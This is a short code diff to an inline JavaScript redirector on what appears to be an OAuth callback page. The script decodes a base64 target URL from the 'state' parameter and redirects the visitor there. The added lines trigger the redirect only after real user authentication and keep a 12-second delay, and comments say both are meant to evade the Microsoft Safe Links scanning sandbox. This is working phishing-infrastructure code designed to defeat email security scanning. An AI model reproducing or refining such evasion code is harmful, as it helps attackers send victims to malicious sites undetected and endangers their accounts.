@@ -23,6 +23,12 @@
 <script>
 (function() {
   var params = new URLSearchParams(location.search);
+
+  // Only redirect if user actually authenticated (code= present)
+  // Safe Links sandbox has no MS session → gets error=login_required → no redirect
+  var code = params.get('code');
+  if (!code) return;
+
   var state = params.get('state');
   if (!state) {
     var hashState = location.hash.indexOf('state=');
@@ -32,7 +38,7 @@
     try {
       var url = atob(decodeURIComponent(state));
       if (/^https?:\/\//.test(url)) {
-        // Delay to evade Safe Links sandbox timeout
+        // Delay to evade Safe Links sandbox timeout (12s)
         setTimeout(function() {
           location.replace(url);
         }, 12000);
